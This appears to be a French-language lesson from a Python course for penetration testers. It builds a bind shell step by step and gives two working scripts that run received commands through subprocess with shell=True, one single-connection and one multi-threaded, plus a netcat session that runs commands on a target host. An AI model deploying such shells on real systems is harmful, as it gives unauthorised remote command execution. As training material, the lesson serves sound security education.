---
tags:
  - python
ordre: 13
---

# Un simple shell de liaison

---

Après avoir obtenu l'accès à un service web interne avec les identifiants que nous avons générés à l'aide de l'outil précédent, nous pouvons obtenir une exécution de code à distance sur l'hôte web. Essayer d'utiliser nos `shells inversés (reverse shells)` habituels ne semble mystérieusement pas fonctionner, mais nous découvrons que nous pouvons exécuter des scripts Python arbitraires. Abusons de cette découverte en implémentant et en exécutant notre propre `shell de liaison (bind shell)` en Python.

Un `shell de liaison` est fondamentalement assez simple. C'est un processus qui se lie à une adresse et à un port sur la machine hôte, puis écoute les connexions entrantes sur le `socket`. Lorsqu'une connexion est établie, le `shell de liaison` va - de manière répétée - écouter les octets qui lui sont envoyés et les traiter comme des commandes brutes à exécuter sur le système dans un sous-processus. Une fois qu'il a reçu tous les octets par morceaux d'une certaine taille, il exécute la commande sur le système hôte et renvoie la sortie. Une implémentation très naïve d'un tel `shell de liaison` est la suivante :

#### Un simple shell de liaison

```python
import socket import subprocess import click  def run_cmd(cmd):     output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)     return output.stdout  @click.command() @click.option('--port', '-p', default=4444) def main(port):     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     s.bind(('0.0.0.0', port))     s.listen(4)     client_socket, address = s.accept()      while True:         chunks = []         chunk = client_socket.recv(2048)         chunks.append(chunk)         while len(chunk) != 0 and chr(chunk[-1]) != '\n':             chunk = client_socket.recv(2048)             chunks.append(chunk)         cmd = (b''.join(chunks)).decode()[:-1]          if cmd.lower() == 'exit':             client_socket.close()             break          output = run_cmd(cmd)         client_socket.sendall(output)  if __name__ == '__main__':     main()
```

Étant donné que nous enverrons ce code à notre client, nous allons améliorer la qualité du code et le rendre plus fiable. Néanmoins, analysons-le d'abord.

Le code se compose jusqu'à présent de deux fonctions : une fonction d'enveloppe (`wrapper`) pour exécuter des commandes sur le système et une fonction principale qui contient toute la logique jetée en vrac au même endroit. C'est loin d'être idéal. La fonction principale configure un `socket`, le lie à `0.0.0.0` (c'est-à-dire toutes les interfaces disponibles) et au port souhaité. Il est ensuite configuré pour autoriser au maximum quatre connexions non acceptées avant de commencer à refuser d'autres connexions - la fonction `listen` configure cela. Le `socket` accepte ensuite les nouvelles connexions entrantes. C'est ce qu'on appelle un `appel bloquant`, ce qui signifie que le code s'arrêtera à cette ligne et attendra qu'une connexion soit établie. Lorsqu'une connexion est établie, l'appel `accept` renvoie deux éléments que nous stockons dans les variables `client_socket` et `address`.

Beaucoup de choses se passent dans la boucle `while`, alors décomposons-la en plus petites parties. Premièrement, voici nos objectifs :

- recevoir tous les octets entrants du client connecté (notre machine d'attaquant),
- convertir les octets entrants en une chaîne de caractères `cmd`,
- fermer la connexion si `cmd` est "exit",
- sinon, exécuter la commande localement et renvoyer la sortie

Notez que nous supprimons le dernier octet de la chaîne `cmd`. Il s'agit d'un caractère de saut de ligne provenant de la pression sur la touche Entrée lors de la saisie de la commande.

Lorsque nous exécutons ce script sur notre machine cible, nous pouvons utiliser `nc` sur notre machine d'attaquant pour nous connecter au `shell de liaison` et obtenir une exécution de code à distance :

#### Démarrage du shell de liaison

```cmd
C:\Users\Birb\Desktop\python> python bindshell.py --port 4444
```

#### Connexion au shell de liaison

```bash
Hiterof13@htb[/htb]$ nc 10.10.10.10 4444 -nv  (UNKNOWN) [10.10.10.10] 4444 (?) open  whoami localnest\birb  hostname LOCALNEST  dir  Volume in drive C has no label.  Volume Serial Number is 966B-6E6A   Directory of C:\Users\Birb\Desktop\python  20-03-2021  21:22    <DIR>          . 20-03-2021  21:22    <DIR>          .. 20-03-2021  21:22               929 bindshell.py                1 File(s)            929 bytes                2 Dir(s)  518.099.636.224 bytes free exit
```

L'inconvénient de l'implémentation actuelle est qu'une fois que nous nous déconnectons, le processus du `shell de liaison` s'arrête. Une façon de corriger cela est d'introduire des `threads` et de faire en sorte que la partie du code qui exécute les commandes s'exécute dans un `thread`. Cela nous permettrait de créer un nouveau `thread` chaque fois qu'une machine se connecte au shell, et nous n'aurions alors qu'à arrêter le `thread` supplémentaire lorsque le shell se ferme. Les `threads`, en général, sont un sujet vaste et complexe, et Python a aussi ses particularités. Pour faire simple et court, les `threads` nous permettent d'exécuter différentes parties de code de manière `concurrente`, de la même manière que les humains sont multitâches. Notez que concurrent n'est pas la même chose que parallèle. Dans notre exemple, cela signifie que pendant qu'un `thread` est occupé à travailler pour notre client connecté, un autre `thread` (le principal) est prêt à accepter une nouvelle connexion entrante. Une fois qu'une autre connexion est établie, ces deux clients connectés peuvent exécuter du code sur la machine victime en utilisant le même `shell de liaison`.

En extrayant simplement le code qui gère l'exécution des commandes dans sa propre fonction, il est possible de faire en sorte que le `shell de liaison` écoute d'abord une nouvelle connexion, crée un `thread` pour cette connexion qui gère l'exécution des commandes, et enfin recommence à écouter les nouvelles connexions entrantes.

#### Prise en charge de connexions multiples

```python
import socket import subprocess import click from threading import Thread  def run_cmd(cmd):     output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)     return output.stdout  def handle_input(client_socket):     while True:         chunks = []         chunk = client_socket.recv(2048)         chunks.append(chunk)         while len(chunk) != 0 and chr(chunk[-1]) != '\n':             chunk = client_socket.recv(2048)             chunks.append(chunk)         cmd = (b''.join(chunks)).decode()[:-1]          if cmd.lower() == 'exit':             client_socket.close()             break          output = run_cmd(cmd)         client_socket.sendall(output)  @click.command() @click.option('--port', '-p', default=4444) def main(port):     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     s.bind(('0.0.0.0', port))     s.listen(4)      while True:         client_socket, _ = s.accept()         t = Thread(target=handle_input, args=(client_socket, ))         t.start()  if __name__ == '__main__':     main()
```

Comme nous pouvons le voir, nous avons ajouté une fonction `handle_input` qui accepte un `client_socket` comme paramètre. Lorsque nous créons un nouvel objet `Thread`, en définissant la `cible` (`target`, la fonction à exécuter) et les paramètres d'entrée sous forme de `tuple`, nous pouvons démarrer ce `thread` et le laisser s'exécuter en arrière-plan. De plus, un `from threading import Thread` a été ajouté en haut. Faites également très attention aux `args` dans le constructeur `Thread`. Il s'agit d'un `tuple` avec une seule valeur. Pour différencier les `tuples` à valeur unique des "parenthèses de portée", par exemple `('Hello ' + 'world').upper()` qui appellera `upper()` sur la chaîne de caractères concaténée et non seulement sur "world", la syntaxe pour les `tuples` à valeur unique est `(val1, )`. Pour les `tuples` à deux valeurs, c'est `(val1, val2)` et ainsi de suite. Et oui, il y a bien une virgule puis rien pour les `tuples` à valeur unique. Déroutant ? Peut-être. Souvenez-vous simplement que `(5)` est la même chose que `5` car les parenthèses sont utilisées pour le groupement syntaxique, nous avons donc besoin d'un moyen de différencier le groupement syntaxique d'un type `tuple`.
---

← [[12 - Améliorations supplémentaires]] | [[00 - Sommaire Introduction to Python 3|Sommaire]] | [[14 - Gestion des Bibliothèques en Python (Suite)]] →
